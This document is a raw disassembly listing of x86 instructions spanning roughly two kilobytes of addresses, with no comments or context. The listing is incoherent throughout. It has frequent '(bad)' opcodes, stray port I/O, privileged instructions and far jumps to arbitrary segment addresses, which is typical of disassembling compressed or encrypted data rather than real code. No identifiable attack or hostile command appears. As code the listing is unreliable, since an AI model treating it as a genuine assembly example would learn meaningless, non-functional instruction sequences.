  4151b0:	jb     0x41517c
  4151b2:	xchg   esi,eax
  4151b3:	xor    BYTE PTR [eax],cl
  4151b5:	mov    cs,WORD PTR ds:0xbe3faa4e
  4151bb:	sub    cl,BYTE PTR [esi]
  4151bd:	pusha  
  4151be:	sahf   
  4151bf:	jge    0x41520f
  4151c1:	add    eax,0x103ee7bc
  4151c6:	(bad)  
  4151c7:	aad    0x70
  4151c9:	jae    0x4151c7
  4151cb:	mul    BYTE PTR [ebx+0x75099ac9]
  4151d1:	jae    0x4151ab
  4151d3:	test   eax,0xd0433c89
  4151d8:	fstp   TBYTE PTR ds:0x4a8a5528
  4151de:	out    dx,al
  4151df:	test   DWORD PTR [esi-0x64521818],ecx
  4151e5:	shl    BYTE PTR [esi-0x64eb15ed],1
  4151eb:	repnz inc edi
  4151ed:	test   ebp,ebp
  4151ef:	dec    ecx
  4151f0:	dec    ebp
  4151f1:	popa   
  4151f2:	pop    ebp
  4151f3:	inc    esi
  4151f4:	in     al,dx
  4151f5:	lods   al,BYTE PTR ds:[esi]
  4151f6:	(bad)  
  4151f7:	loope  0x41519f
  4151f9:	ds inc edi
  4151fb:	(bad)  
  4151fc:	fcmovnbe st,st(3)
  4151fe:	scas   eax,DWORD PTR es:[edi]
  4151ff:	sub    DWORD PTR es:[ebp+0x65],0x1d
  415204:	repnz push ds
  415206:	das    
  415207:	test   BYTE PTR [eax],bl
  415209:	out    dx,eax
  41520a:	adc    eax,ebx
  41520c:	or     BYTE PTR [ebx+0x249f76c6],dh
  415212:	cwde   
  415213:	cld    
  415214:	xlat   BYTE PTR ds:[ebx]
  415215:	arpl   WORD PTR [eax],bp
  415217:	popa   
  415218:	mov    dl,bh
  41521a:	add    ebp,edi
  41521c:	ret    
  41521d:	pop    esp
  41521e:	fs xor esi,DWORD PTR cs:[ebp+0x318e189a]
  415226:	cdq    
  415227:	mov    dh,0xee
  415229:	adc    eax,0xb9f66fcd
  41522e:	mov    DWORD PTR [ebx+eiz*1-0x19],ecx
  415232:	out    dx,al
  415233:	les    esi,FWORD PTR [eax]
  415235:	jg     0x41523c
  415237:	sbb    eax,DWORD PTR [edi+eiz*4+0x46f6d539]
  41523e:	push   ss
  41523f:	les    esi,FWORD PTR [ebp-0x1aec43c6]
  415245:	xchg   ebx,eax
  415246:	cwde   
  415247:	shr    DWORD PTR [edi],1
  415249:	dec    esp
  41524a:	repnz das 
  41524c:	cmp    al,BYTE PTR [edx+0x60]
  41524f:	sbb    eax,0x55f021ae
  415254:	out    0xe3,eax
  415256:	in     al,dx
  415257:	jmp    0xb294:0x104e373c
  41525e:	fdivr  QWORD PTR [ebx-0x19]
  415261:	in     eax,0x25
  415263:	sbb    al,0x86
  415265:	loope  0x41524f
  415267:	ror    BYTE PTR [edi-0x40],1
  41526a:	cld    
  41526b:	(bad)  [ebx-0x1a]
  41526e:	jmp    0x415272
  415270:	jg     0x4152e0
  415272:	fdivr  QWORD PTR [eax-0x7a]
  415275:	jae    0x41528f
  415277:	test   DWORD PTR [ecx],ebx
  415279:	and    edx,DWORD PTR ds:0xe9ce9241
  41527f:	dec    esp
  415280:	nop
  415281:	fsubp  st(0),st
  415283:	retf   
  415284:	push   0x9ba48799
  415289:	inc    ebx
  41528a:	(bad)  
  41528b:	cmp    DWORD PTR [esp+ebp*2],ebp
  41528e:	dec    edx
  41528f:	sub    eax,DWORD PTR [ecx-0x129efbba]
  415295:	in     al,dx
  415296:	or     DWORD PTR [ebp-0xc],ebp
  415299:	pop    ecx
  41529a:	or     al,BYTE PTR [edi]
  41529c:	js     0x41523b
  41529e:	(bad)  
  41529f:	loopne 0x4152ec
  4152a1:	sbb    dl,BYTE PTR [eax]
  4152a3:	or     al,0xbd
  4152a5:	dec    ecx
  4152a6:	or     BYTE PTR [ebx+0x47],bl
  4152a9:	into   
  4152aa:	ret    0xf136
  4152ad:	aas    
  4152ae:	pop    ds
  4152af:	push   ebx
  4152b0:	jmp    0x55e03053
  4152b5:	pop    ds
  4152b6:	data16 das 
  4152b8:	dec    eax
  4152b9:	leave  
  4152ba:	aad    0x62
  4152bc:	mov    edi,0xd1f9fcfc
  4152c1:	les    ebp,FWORD PTR [ebp-0x2e]
  4152c4:	mov    WORD PTR [esi+ecx*4+0x7470bccd],gs
  4152cb:	jecxz  0x4152cb
  4152cd:	sbb    BYTE PTR gs:[edx-0x23],dh
  4152d1:	inc    edi
  4152d2:	repz dec ebx
  4152d4:	mov    eax,ds:0xec7729f4
  4152d9:	push   eax
  4152da:	dec    esp
  4152db:	adc    ecx,ebp
  4152dd:	js     0x4152e0
  4152df:	jbe    0x4152cf
  4152e1:	jae    0x4152d9
  4152e3:	or     BYTE PTR [ecx+0x32e60ba3],cl
  4152e9:	jmp    FWORD PTR [ecx+0x47]
  4152ec:	add    al,0x71
  4152ee:	jnp    0x4152b8
  4152f0:	pop    esi
  4152f1:	inc    esi
  4152f2:	(bad)  
  4152f3:	jmp    DWORD PTR [ecx+0x4]
  4152f6:	or     eax,0x8665333b
  4152fb:	pop    eax
  4152fc:	aad    0xba
  4152fe:	mov    dh,0xa7
  415300:	mov    bh,0xec
  415302:	test   al,0x30
  415304:	(bad)  
  415305:	push   cs
  415306:	jae    0x415345
  415308:	jo     0x4152d0
  41530a:	(bad)  
  41530b:	pop    ecx
  41530c:	std    
  41530d:	pop    ss
  41530e:	push   es
  41530f:	mov    esp,0x2ca955d7
  415314:	dec    ebx
  415315:	lea    ecx,[ecx+0x5e8a1f2a]
  41531b:	push   ecx
  41531c:	stos   BYTE PTR es:[edi],al
  41531d:	cmp    DWORD PTR [ecx],esi
  41531f:	push   DWORD PTR [ecx+0x44]
  415322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415323:	in     al,0xc0
  415325:	sub    dh,BYTE PTR [eax-0x24]
  415328:	int3   
  415329:	js     0x41534d
  41532b:	fcomp  st(5)
  41532d:	ins    DWORD PTR es:[edi],dx
  41532e:	push   esp
  41532f:	bnd call 0xfa5e031b
  415335:	leave  
  415336:	jb     0x41533b
  415338:	ss shr ebx,cl
  41533b:	jg     0x415318
  41533d:	int    0x1d
  41533f:	retf   
  415340:	cmp    DWORD PTR [edi],ebp
  415342:	ins    BYTE PTR es:[edi],dx
  415343:	mov    al,0x2a
  415345:	call   0xa8f7632
  41534a:	sbb    eax,0x608fdaf4
  41534f:	cdq    
  415350:	xchg   ebp,eax
  415351:	add    BYTE PTR [ebx-0x4b],cl
  415354:	jne    0x41538e
  415356:	fwait
  415357:	std    
  415358:	mul    DWORD PTR ds:0xd272e68d
  41535e:	arpl   WORD PTR [ebp-0x79],ax
  415361:	sbb    ch,BYTE PTR [esi-0x4b3c7656]
  415367:	sub    edi,DWORD PTR [ecx]
  415369:	xor    al,dh
  41536b:	jns    0x4152fa
  41536d:	xor    ebp,DWORD PTR ds:0xa1040ff9
  415373:	adc    BYTE PTR [ebx],ah
  415375:	ficom  DWORD PTR [ecx-0x50]
  415378:	jg     0x415349
  41537a:	push   ecx
  41537b:	adc    eax,0x24d56b95
  415380:	push   0x78cf0ce
  415385:	xor    esi,DWORD PTR [edi-0x50]
  415388:	pop    edx
  415389:	push   ss
  41538a:	inc    esp
  41538b:	stos   BYTE PTR es:[edi],al
  41538c:	lods   al,BYTE PTR ds:[esi]
  41538d:	xchg   ecx,eax
  41538e:	inc    ecx
  41538f:	rcr    BYTE PTR [eax-0xd],1
  415392:	adc    eax,0xcfe06c4c
  415397:	call   0x94e2:0x81536a97
  41539e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41539f:	and    eax,0xe48b85f6
  4153a4:	xchg   DWORD PTR [edx+0x3d],ecx
  4153a7:	sub    eax,0x2906a2bb
  4153ac:	push   ds
  4153ad:	sbb    BYTE PTR [edx-0x79],ch
  4153b0:	cmp    DWORD PTR [ecx+ebx*2],0x1776ca
  4153b7:	call   0xd46f:0xfda68fd8
  4153be:	sub    al,0x7c
  4153c0:	jae    0x415410
  4153c2:	dec    esi
  4153c3:	aam    0x25
  4153c5:	mov    ch,0x27
  4153c7:	int    0xec
  4153c9:	outs   dx,BYTE PTR ds:[esi]
  4153ca:	jo     0x4153f7
  4153cc:	stos   DWORD PTR es:[edi],eax
  4153cd:	sar    BYTE PTR [ecx-0x49],cl
  4153d0:	cli    
  4153d1:	pop    ebx
  4153d2:	mov    esp,0xcf6b4262
  4153d7:	(bad)  
  4153d8:	cli    
  4153d9:	dec    ecx
  4153da:	scas   al,BYTE PTR es:[edi]
  4153db:	xchg   BYTE PTR [esi+0x66],dh
  4153de:	stos   DWORD PTR es:[edi],eax
  4153df:	xchg   dl,cl
  4153e1:	xor    al,BYTE PTR [eax-0x6d0b0797]
  4153e7:	pop    esi
  4153e8:	mov    ecx,DWORD PTR [edi-0x500e1c1b]
  4153ee:	test   eax,0x875a0384
  4153f3:	pop    edx
  4153f4:	out    0x1a,eax
  4153f6:	or     al,ah
  4153f8:	jns    0x4153a0
  4153fa:	dec    esi
  4153fb:	mov    ebp,0xf3b69949
  415400:	jmp    0x4745fb85
  415405:	(bad)  
  415406:	mov    esp,0xe86f14ec
  41540b:	mov    edx,0xfa888381
  415410:	es push ebx
  415412:	xchg   esi,eax
  415413:	jg     0x4153d6
  415415:	imul   ebx,edx,0x32504f0a
  41541b:	mov    ah,0x52
  41541d:	xchg   ebp,eax
  41541e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41541f:	mov    ecx,0xced174bb
  415424:	and    al,0xb2
  415426:	stos   BYTE PTR es:[edi],al
  415427:	cs and eax,0x694244b9
  41542d:	pop    ebp
  41542e:	cmc    
  41542f:	popf   
  415430:	leave  
  415431:	mov    dh,0xd3
  415433:	mov    ebx,DWORD PTR [ebx-0x11]
  415436:	xor    DWORD PTR es:[ebp+0x25],esp
  41543a:	pop    ebx
  41543b:	inc    eax
  41543c:	xadd   BYTE PTR [ecx],ah
  41543f:	js     0x4153e8
  415441:	dec    eax
  415442:	cmp    ecx,DWORD PTR [ebx+0x68]
  415445:	push   edx
  415446:	aas    
  415447:	push   edi
  415448:	outs   dx,BYTE PTR ds:[esi]
  415449:	rcr    BYTE PTR [ecx-0x41ae4f0b],cl
  41544f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415450:	mov    ebx,0x8346e002
  415455:	out    dx,al
  415456:	add    al,0x5d
  415458:	jmp    0x71c5302b
  41545d:	xchg   esp,eax
  41545e:	sub    BYTE PTR [esi+0x22],dl
  415461:	xchg   ebp,eax
  415462:	dec    esp
  415463:	mov    esi,0xf7b46592
  415468:	jge    0x415435
  41546a:	xchg   ecx,eax
  41546b:	adc    BYTE PTR [edx+0x1],0xc2
  41546f:	and    edi,ebp
  415471:	push   es
  415472:	ds mov cl,bl
  415475:	or     ah,BYTE PTR [edx]
  415477:	stc    
  415478:	or     esp,DWORD PTR [eax+eax*4]
  41547b:	mov    bh,0x68
  41547d:	mov    BYTE PTR [ecx+ecx*4],cl
  415480:	and    ch,BYTE PTR [eax-0x79]
  415483:	sahf   
  415484:	dec    edx
  415485:	jno    0x41541c
  415487:	sub    eax,0xf768bbd7
  41548c:	lods   al,BYTE PTR ds:[esi]
  41548d:	sbb    BYTE PTR [ecx+ebx*1+0x3b],bl
  415491:	add    dh,BYTE PTR [ecx]
  415493:	out    0xd4,al
  415495:	push   ebp
  415496:	inc    edx
  415497:	pusha  
  415498:	jb     0x41547f
  41549a:	(bad)
  41549d:	mov    al,ds:0x8a0b0792
  4154a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154a3:	and    ebp,DWORD PTR [ebx+eiz*4-0x2f]
  4154a7:	nop
  4154a8:	dec    edi
  4154a9:	sbb    eax,DWORD PTR [ebx+0x30a6d68d]
  4154af:	js     0x41543c
  4154b1:	in     eax,0x3c
  4154b3:	sub    eax,0xd9d2115d
  4154b8:	in     al,dx
  4154b9:	popa   
  4154ba:	daa    
  4154bb:	imul   edx,DWORD PTR [eax+0x5c189255],0xffffff93
  4154c2:	ret    
  4154c3:	rol    DWORD PTR [ebp+edx*1-0x6e],1
  4154c7:	adc    eax,0x9d0c8abc
  4154cc:	mov    ch,0x8
  4154ce:	pushf  
  4154cf:	outs   dx,DWORD PTR fs:[esi]
  4154d1:	sbb    ebp,edi
  4154d3:	(bad)  
  4154d4:	fbld   TBYTE PTR [ebx+0x575fdd66]
  4154da:	loopne 0x41549d
  4154dc:	cdq    
  4154dd:	enter  0x1388,0x8c
  4154e1:	sub    eax,0x13d6278b
  4154e6:	sub    ch,BYTE PTR [eax+ebp*4+0x3f768405]
  4154ed:	push   ecx
  4154ee:	sbb    esp,edx
  4154f0:	(bad)  
  4154f1:	push   0xffffffa3
  4154f3:	inc    esi
  4154f4:	mov    esp,0x86388bd
  4154f9:	jne    0x41553b
  4154fb:	mov    dl,0x4a
  4154fd:	jl     0x4154c2
  4154ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415500:	inc    esi
  415501:	add    esp,ebp
  415503:	sub    ecx,DWORD PTR [ebx+0x7029c1e2]
  415509:	arpl   WORD PTR [ecx+0x2510bdda],bp
  41550f:	push   esp
  415510:	xor    DWORD PTR [esi-0x27],0x4
  415514:	retf   
  415515:	mov    ch,0xad
  415517:	(bad)  
  415518:	sub    esp,DWORD PTR [ebp-0x696af154]
  41551e:	sbb    cl,BYTE PTR ss:[eax-0x4ecdd02f]
  415525:	sbb    eax,0x647b4230
  41552a:	dec    esi
  41552b:	(bad)  [esi]
  41552d:	out    dx,al
  41552e:	clc    
  41552f:	in     eax,0x33
  415531:	mov    bl,0x5f
  415533:	xchg   esi,eax
  415534:	(bad)  
  415535:	pop    esp
  415536:	pushf  
  415537:	repnz or dl,bl
  41553a:	jge    0x41550d
  41553c:	lahf   
  41553d:	dec    ebx
  41553e:	push   eax
  41553f:	inc    ebp
  415540:	pop    ebx
  415541:	xchg   edi,ebp
  415543:	jb     0x41551e
  415545:	or     ebx,DWORD PTR [edi]
  415547:	dec    edx
  415548:	data16 fld QWORD PTR cs:[edx-0x36]
  41554d:	ss add eax,0x701d79ba
  415553:	pusha  
  415554:	fistp  WORD PTR [esi+ebx*8]
  415557:	mov    ds:0x55550df5,eax
  41555c:	sub    al,0xd4
  41555e:	ret    0x3d61
  415561:	ret    0x6de8
  415564:	test   eax,0x22d2ae2a
  415569:	and    ah,BYTE PTR [eax+edi*1+0x2b]
  41556d:	pop    ds
  41556e:	outs   dx,BYTE PTR ds:[esi]
  41556f:	lds    eax,FWORD PTR [ecx+0x4d]
  415572:	push   ecx
  415573:	jle    0x41557c
  415575:	push   edi
  415576:	and    dh,BYTE PTR [esi-0x69a1c838]
  41557c:	pop    ebp
  41557d:	fwait
  41557e:	inc    ebx
  41557f:	pop    esp
  415580:	jne    0x415586
  415582:	pop    esp
  415583:	stc    
  415584:	stos   DWORD PTR es:[edi],eax
  415585:	or     dh,cl
  415587:	cli    
  415588:	mov    al,0x86
  41558a:	ins    DWORD PTR es:[edi],dx
  41558b:	cwde   
  41558c:	pushf  
  41558d:	int    0x9e
  41558f:	pop    eax
  415590:	(bad)  [edx+0x4f2b7aa7]
  415596:	or     ebp,DWORD PTR [ecx-0x12]
  415599:	add    ebp,ebp
  41559b:	mov    bh,0xc9
  41559d:	lea    esi,[ecx-0x1301ce29]
  4155a3:	repz sti 
  4155a5:	jmp    0x4155ea
  4155a7:	inc    BYTE PTR [edi+0x233a81ac]
  4155ad:	xor    DWORD PTR [eax+edx*1+0x9],0x3b8a5759
  4155b5:	sti    
  4155b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155b7:	xchg   ecx,eax
  4155b8:	addr16 xchg esp,eax
  4155bb:	cld    
  4155bc:	lahf   
  4155bd:	js     0x415544
  4155bf:	push   ebx
  4155c0:	jmp    0x53fa83e8
  4155c5:	fs push eax
  4155c7:	aam    0x8b
  4155c9:	pop    esi
  4155ca:	inc    edx
  4155cb:	dec    esi
  4155cc:	or     edi,esi
  4155ce:	add    esp,DWORD PTR [ebp-0x7961c066]
  4155d4:	cmp    ecx,DWORD PTR [ecx+0xe86f5cd]
  4155da:	xor    eax,0xa2718b02
  4155df:	dec    BYTE PTR [edi+0x4d]
  4155e2:	jo     0x415639
  4155e4:	ret    0xaf7b
  4155e7:	call   0x7a44:0x3d097014
  4155ee:	jnp    0x415643
  4155f0:	retf   0x8bc1
  4155f3:	mov    gs,WORD PTR [ebp-0x2]
  4155f6:	dec    ecx
  4155f7:	jmp    0x35182b32
  4155fc:	int3   
  4155fd:	adc    eax,0xe51c2ee0
  415602:	dec    ebx
  415603:	or     DWORD PTR [ebx+0x1abfa35c],ebp
  415609:	aam    0xbe
  41560b:	jnp    0x41568a
  41560d:	xor    cl,BYTE PTR [ebp-0x693ad6b2]
  415613:	jb     0x415669
  415615:	sub    eax,0x2740130d
  41561a:	(bad)  
  41561b:	mov    ah,0x31
  41561d:	lahf   
  41561e:	test   al,0x13
  415620:	cli    
  415621:	(bad)  
  415622:	jg     0x41562f
  415624:	xor    al,al
  415626:	inc    ecx
  415627:	or     BYTE PTR [ecx],0x59
  41562a:	push   ebx
  41562b:	lahf   
  41562c:	repz data16 adc BYTE PTR [ecx+0x57],0xa4
  415632:	(bad)  
  415633:	retf   
  415634:	cs mov ah,0xbf
  415637:	ja     0x415654
  415639:	into   
  41563a:	fdivr  st(7),st
  41563c:	daa    
  41563d:	xchg   ebx,eax
  41563e:	add    eax,0xafb752a3
  415643:	lea    esp,[eax]
  415645:	add    al,0x9c
  415647:	push   ebx
  415648:	retf   
  415649:	sub    ecx,edx
  41564b:	enter  0xc722,0x49
  41564f:	mov    eax,ds:0xd557c4a4
  415654:	mov    cl,0x51
  415656:	mov    WORD PTR [edi],gs
  415658:	(bad)  
  41565c:	cmc    
  41565d:	loopne 0x4156a1
  41565f:	xchg   esp,eax
  415660:	lods   al,BYTE PTR ds:[esi]
  415661:	mov    esi,edi
  415663:	mov    al,0x14
  415665:	adc    BYTE PTR [ebp-0x29879e65],bh
  41566b:	std    
  41566c:	fsubr  st,st(6)
  41566e:	jg     0x4156b0
  415670:	cli    
  415671:	xor    BYTE PTR [edx],ah
  415673:	paddw  mm2,mm1
  415676:	ret    
  415677:	pop    edi
  415678:	mov    dl,0x3f
  41567a:	out    dx,eax
  41567b:	add    edi,esi
  41567d:	cmp    al,BYTE PTR [esi]
  41567f:	in     al,0x1c
  415681:	mov    eax,DWORD PTR [ebx+0x7c]
  415684:	daa    
  415685:	dec    ebp
  415686:	push   eax
  415687:	dec    ecx
  415688:	adc    esi,DWORD PTR [bp+si+0x4b]
  41568c:	std    
  41568d:	and    esp,DWORD PTR [eax+0xac6cc8f]
  415693:	dec    edx
  415694:	xor    ah,ah
  415696:	(bad)  
  415697:	pop    edi
  415698:	adc    cl,BYTE PTR [edi+eax*1+0x85018bc]
  41569f:	cmp    dh,ch
  4156a1:	repz xor dh,BYTE PTR ds:0x8c8e72c5
  4156a8:	mov    ds:0xfd28f68b,al
  4156ad:	sbb    ebp,DWORD PTR [eax+0x259d26ca]
  4156b3:	cmp    al,0xf4
  4156b5:	je     0x4156c2
  4156b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b8:	iret   
  4156b9:	emms   
  4156bb:	outs   dx,BYTE PTR ds:[esi]
  4156bc:	in     al,0x82
  4156be:	jecxz  0x4156ec
  4156c0:	pop    ss
  4156c1:	sub    BYTE PTR [ecx+0x5f14337],0x66
  4156c8:	stc    
  4156c9:	aad    0xc0
  4156cb:	(bad)  
  4156cc:	jns    0x4156f3
  4156ce:	sti    
  4156cf:	aad    0x20
  4156d1:	test   al,0xf7
  4156d3:	scas   al,BYTE PTR es:[edi]
  4156d4:	push   0x5d
  4156d6:	sbb    BYTE PTR [esi+0xc],ch
  4156d9:	in     eax,0xf2
  4156db:	cmp    BYTE PTR [ebx+eiz*4-0xb68c173],ah
  4156e2:	sub    DWORD PTR [ecx+0x28],ebx
  4156e5:	and    edi,DWORD PTR [esi+0x1987a20c]
  4156eb:	cmp    bl,BYTE PTR [edx+eax*1-0x38f52bfe]
  4156f2:	inc    edi
  4156f3:	jne    0x41568b
  4156f5:	or     al,0x7a
  4156f7:	in     eax,dx
  4156f8:	or     edi,DWORD PTR [ecx]
  4156fa:	popa   
  4156fb:	dec    ecx
  4156fc:	(bad)  
  4156fd:	xchg   ebx,eax
  4156fe:	and    ebp,edi
  415700:	outs   dx,BYTE PTR ds:[esi]
  415701:	ret    0x23b4
  415704:	xlat   BYTE PTR ds:[ebx]
  415705:	bound  edx,QWORD PTR [eax+0x7793c98f]
  41570b:	or     DWORD PTR [edi+eax*1],0x53fbd7e5
  415712:	lock imul di,WORD PTR [ecx+ecx*1],0x6d45
  415719:	ret    
  41571a:	or     eax,0x724bf050
  41571f:	vcmppd ymm0,ymm4,YMMWORD PTR [eax],0x67
  415724:	sbb    BYTE PTR [ebx+0x373de77],ah
  41572a:	cmp    dh,BYTE PTR [edx-0x2456ec69]
  415730:	inc    edx
  415731:	pop    esi
  415732:	add    BYTE PTR [edi],dh
  415734:	sti    
  415735:	xchg   ebx,eax
  415736:	out    dx,al
  415737:	out    dx,al
  415738:	fs call 0x7582:0xd5c04086
  415740:	dec    ebx
  415741:	sbb    esi,0xffffffe5
  415744:	jns    0x4156ee
  415746:	jb     0x4156dc
  415748:	in     eax,0xef
  41574a:	add    eax,0xc284097c
  41574f:	lahf   
  415750:	pop    edx
  415751:	out    0x2b,eax
  415753:	inc    esp
  415754:	push   edi
  415755:	adc    DWORD PTR [ecx-0x62],edi
  415758:	sub    al,0x53
  41575a:	push   es
  41575b:	cli    
  41575c:	icebp  
  41575d:	out    0xd3,al
  41575f:	adc    al,0x45
  415761:	cmp    al,0x1e
  415763:	fcmovnb st,st(2)
  415765:	mov    edi,0x91b30a11
  41576a:	push   cs
  41576b:	inc    ebp
  41576c:	dec    ebp
  41576d:	mov    esp,0x36811ada
  415772:	test   BYTE PTR [ebp+eiz*1-0x3c932f24],0x1
  41577a:	inc    ecx
  41577b:	push   ebp
  41577c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41577d:	jg     0x415706
  41577f:	add    al,0x31
  415781:	pop    ebp
  415782:	call   0xfce88c97
  415787:	jne    0x4157be
  415789:	pop    edi
  41578a:	leave  
  41578b:	popa   
  41578c:	mov    DWORD PTR ds:0xae7c4834,0x900ba041
  415796:	sbb    al,bh
  415798:	(bad)  
  415799:	call   0x7b6c8089
  41579e:	repz in eax,0x36
  4157a1:	shl    ecx,0x26
  4157a4:	pusha  
  4157a5:	pop    esi
  4157a6:	lds    ecx,FWORD PTR [ecx+0x7080c8e]
  4157ac:	and    DWORD PTR [ebp-0x80],esi
  4157af:	mov    ds:0x8877b233,al
  4157b4:	jmp    0xb348c939
  4157b9:	rol    DWORD PTR [ebx],cl
  4157bb:	es pop ecx
  4157bd:	jmp    0xdd90:0xf9425ed4
  4157c4:	or     DWORD PTR gs:[eax+0x2a03329e],0xffffffb3
  4157cc:	mov    edi,0xc18a0467
  4157d1:	popf   
  4157d2:	cmc    
  4157d3:	cmp    DWORD PTR fs:[ecx-0x15bb5013],esi
  4157da:	jno    0x415803
  4157dc:	mov    al,ds:0x8d9db5e1
  4157e1:	(bad)  [edi+0x75c31024]
  4157e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e8:	push   es
  4157e9:	mov    al,ds:0x2ad8c54e
  4157ee:	push   es
  4157ef:	je     0x415789
  4157f1:	sbb    BYTE PTR [edi],cl
  4157f3:	mov    DWORD PTR [eax-0x4c07a9c5],ebp
  4157f9:	pop    edi
  4157fa:	aas    
  4157fb:	(bad)
  4157ff:	mov    DWORD PTR [esp+edx*8-0x38],esi
  415803:	fdiv   st(7),st
  415805:	loopne 0x4157bc
  415807:	lds    eax,FWORD PTR [esi]
  415809:	int3   
  41580a:	loope  0x41586d
  41580c:	push   edx
  41580d:	popf   
  41580e:	xlat   BYTE PTR ds:[ebx]
  41580f:	lahf   
  415810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415811:	pop    ecx
  415812:	ss xchg ecx,eax
  415814:	push   esi
  415815:	outs   dx,DWORD PTR ds:[esi]
  415816:	jp     0x415845
  415818:	mov    al,0x60
  41581a:	jns    0x415841
  41581c:	xchg   ecx,eax
  41581d:	pop    es
  41581e:	mov    eax,DWORD PTR [esi-0x5e]
  415821:	aaa    
  415822:	lds    esp,FWORD PTR [ecx-0x16]
  415825:	jb     0x4157ef
  415827:	(bad)  
  415828:	outs   dx,BYTE PTR ds:[esi]
  415829:	xchg   esp,esi
  41582b:	retf   
  41582c:	pop    DWORD PTR [esi-0x207abb3f]
  415832:	mov    dl,0x3d
  415834:	mov    eax,0xbf882451
  415839:	jns    0x41587b
  41583b:	out    0xf8,eax
  41583d:	pop    ebx
  41583e:	mov    eax,0xa3380d9f
  415843:	repz xor ch,BYTE PTR [esi]
  415846:	adc    cl,BYTE PTR [esp+esi*1-0x66e777bc]
  41584d:	sbb    eax,0x7b2a3dcc
  415852:	push   edi
  415853:	mov    ecx,0x1a7572a
  415858:	dec    eax
  415859:	adc    al,0xf2
  41585b:	test   BYTE PTR [ecx+0x4ecb1f66],0xb6
  415862:	sahf   
  415863:	pop    es
  415864:	cmp    DWORD PTR [eax],ecx
  415866:	mov    cl,0x5e
  415868:	out    dx,al
  415869:	iret   
  41586a:	xor    bl,BYTE PTR [edi+eax*4-0x3051a817]
  415871:	sti    
  415872:	xchg   ebx,eax
  415873:	in     al,0x9a
  415875:	or     ebp,DWORD PTR ds:0x4a428bc8
  41587b:	and    dl,bl
  41587d:	jb     0x41589a
  41587f:	cli    
  415880:	loop   0x41580e
  415882:	das    
  415883:	in     al,0xa4
  415885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415886:	mov    eax,0xd1cc411e
  41588b:	fiadd  WORD PTR [ecx-0x505f12e5]
  415891:	out    0x5b,eax
  415893:	inc    esi
  415894:	inc    eax
  415895:	std    
  415896:	pop    esp
  415897:	js     0x4158f0
  415899:	call   0xd2b4:0x35cdb69f
  4158a0:	mov    ebp,0x6c5ba98a
  4158a5:	cdq    
  4158a6:	clc    
  4158a7:	clc    
  4158a8:	into   
  4158a9:	mov    edi,0x1a2ebba
  4158ae:	cmp    al,0xce
  4158b0:	mov    bl,BYTE PTR [ebp-0x13ce9ccf]
  4158b6:	or     edx,DWORD PTR [eax+ebx*2+0x3bc0342a]
  4158bd:	imul   esi,edi,0xffffffeb
  4158c0:	xor    BYTE PTR [ebx*8-0x2a269d6e],bh
  4158c7:	sti    
  4158c8:	test   DWORD PTR [ebp-0x27],0x23ce34f2
  4158cf:	xor    DWORD PTR [edx+eax*8],esi
  4158d2:	dec    edi
  4158d3:	(bad)  
  4158d5:	rol    DWORD PTR [ecx+0x0],0x55
  4158d9:	(bad)  
  4158db:	or     eax,0x4f13a57f
  4158e0:	dec    esp
  4158e1:	mov    eax,ds:0xdc0b9d17
  4158e7:	pop    edi
  4158e8:	mov    eax,0xfc5e6306
  4158ed:	repz sar DWORD PTR [esi-0x61ea92ee],cl
  4158f4:	add    eax,0x9f8d5805
  4158f9:	mov    dl,BYTE PTR [ebx+eax*4]
  4158fc:	gs jg  0x415933
  4158ff:	or     eax,0x729015b5
  415904:	dec    ecx
  415905:	mov    ebx,0x47745af9
  41590a:	hlt    
  41590b:	fild   DWORD PTR [esi]
  41590d:	lock pop es
  41590f:	fadd   DWORD PTR [edx-0x33]
  415912:	outs   dx,DWORD PTR ds:[esi]
  415913:	(bad)  
  415914:	xchg   ecx,eax
  415915:	push   edx
  415916:	jg     0x41595e
  415918:	in     eax,dx
  415919:	enter  0xb2bf,0x56
  41591d:	out    0x94,eax
  41591f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415920:	add    al,0x85
  415922:	jl     0x41590a
  415924:	pop    ds
  415925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415926:	xlat   BYTE PTR ds:[ebx]
  415927:	and    ah,BYTE PTR [eax]
  415929:	repz and eax,0x8c7c2d55
  41592f:	sub    DWORD PTR [ebx-0x41],0x2c
  415933:	mov    dl,0xc7
  415935:	das    
  415936:	mov    esp,?
  415938:	cmp    DWORD PTR [edi+0x2be67df6],0x8f655467
  415942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415943:	xor    BYTE PTR cs:[eax+0x7cdfbe7d],ah
  41594a:	cli    
  41594b:	inc    ecx
  41594c:	cli    
  41594d:	or     ch,BYTE PTR [edi+0x9ede2fc]
  415953:	out    0xbc,al
  415955:	mov    es,WORD PTR ds:0x8bad837c
  41595b:	sbb    eax,0x5b0a781b
  415960:	dec    edi
  415961:	cmp    eax,0xe9ef13f1
  415966:	xor    al,0xa7
  415968:	retf   
  415969:	es cmp dl,dh
  41596c:	push   cs
  41596d:	adc    ah,BYTE PTR [edi+0x24]
  415970:	xchg   esi,eax
  415971:	test   al,0x53
  415973:	mov    cl,0xd2
  415975:	xor    DWORD PTR [ebp+edx*2-0x4c],0xffffffa3
  41597a:	test   BYTE PTR [ecx+0x75],cl
  41597d:	loop   0x415951
  41597f:	push   edx
  415980:	add    dl,0x26
  415983:	mov    dh,0x84
  415985:	test   BYTE PTR [eax+0x6fef6492],bh
  41598b:	fwait
  41598c:	aas    
  41598d:	xor    eax,0xdd617e5c
  415992:	repnz or ah,cl
  415995:	cdq    
  415996:	xor    eax,0xbc03e393
  41599b:	jmp    0x58ca2ba9
  4159a0:	js     0x41598b
  4159a2:	out    0xca,al
  4159a4:	push   edx
  4159a5:	out    dx,al
  4159a6:	mov    bh,0xf2
  4159a8:	(bad)  
  4159aa:	test   al,0x51
